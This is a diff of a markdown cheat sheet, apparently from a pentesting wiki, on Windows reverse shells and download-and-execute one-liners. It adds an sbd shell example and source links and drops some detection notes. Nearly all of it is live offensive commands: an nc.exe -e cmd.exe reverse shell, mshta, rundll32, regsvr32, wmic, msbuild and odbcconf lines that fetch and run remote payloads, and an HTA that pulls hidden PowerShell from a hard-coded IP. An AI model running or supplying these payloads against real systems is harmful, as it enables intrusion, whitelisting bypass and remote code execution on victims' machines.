@@ -35,7 +35,20 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 
 ## SBD
 
-**sbd** is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe (part of the Kali linux distribution: /usr/share/windows-resources/sbd/sbd.exe) can be uploaded to a Windows box as a Netcat alternative.
+**[sbd](https://www.kali.org/tools/sbd/) is a portable and secure Netcat alternative**. It works on Unix-like systems and Win32. With features like strong encryption, program execution, customizable source ports, and continuous reconnection, sbd provides a versatile solution for TCP/IP communication. For Windows users, the sbd.exe version from the Kali Linux distribution can be used as a reliable replacement for Netcat.
+
+```bash
+# Victims machine
+sbd -l -p 4444 -e bash -v -n
+listening on port 4444
+
+
+# Atackers
+sbd 10.10.10.10 4444
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 
 ## Python
 
@@ -113,30 +126,23 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 
 ## Mshta
 
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
-
-Process performing network call: **mshta.exe**\
-Payload written on disk: **IE local cache**
 
 ```bash
 mshta http://webserver/payload.hta
 ```
 
-Process performing network call: **mshta.exe**\
-Payload written on disk: **IE local cache**
-
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
 
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
-
 #### **Example of hta-psh reverse shell (use hta to download and execute PS backdoor)**
 
-```markup
+```xml
  <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
 
@@ -146,7 +152,7 @@ Payload written on disk: **WebDAV client local cache**
 
 [**From here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 
-```markup
+```xml
 <html>
 <head>
 <HTA:APPLICATION ID="HelloExample">
@@ -167,7 +173,7 @@ Payload written on disk: **WebDAV client local cache**
 
 [**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
-```markup
+```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
@@ -199,23 +205,22 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 **Detected by defender**
 
+
+
+
 ## **Rundll32**
 
 [**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
+
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
 
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
-
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-
-Process performing network call: **rundll32.exe**\
-Payload written on disk: **IE local cache**
 
 **Detected by defender**
 
@@ -223,7 +228,7 @@ Payload written on disk: **IE local cache**
 
 [**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 
-```bash
+```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
 <!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
@@ -259,19 +264,16 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 
 ## Regsvr32
 
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 
-Process performing network call: **regsvr32.exe**\
-Payload written on disk: **IE local cache**
-
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
 
 **Detected by defender**
 
@@ -312,6 +314,8 @@ run
 **You can download & execute very easily a Koadic zombie using the stager regsvr**
 
 ## Certutil
+
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
 Download a B64dll, decode it and execute it.
 
@@ -389,16 +393,16 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-```
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+
+```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
 
-Process performing network call: **wmic.exe**\
-Payload written on disk: **IE local cache**
-
 Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 
-```
+```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
 <output method="text"/>
@@ -416,12 +420,11 @@ Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d
 
 ## Msbuild
 
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
 
 You can use this technique to bypass Application Whitelisting and Powershell.exe restrictions. As you will be prompted with a PS shell.\
 Just download this and execute it: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
@@ -446,12 +449,11 @@ You can download a basic C# reverse shell from here: [https://gist.github.com/Ba
 
 ## **Regasm/Regsvc**
 
-```
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
 
@@ -459,12 +461,11 @@ Payload written on disk: **WebDAV client local cache**
 
 ## Odbcconf
 
-```
+* [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+
+```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-
-Process performing network call: **svchost.exe**\
-Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
 
@@ -567,7 +568,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive PS modules and proxy detection (IEX)
 
-## Bibliography
+## References
 
 * [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 * [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
@@ -575,7 +576,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 * [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
+* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
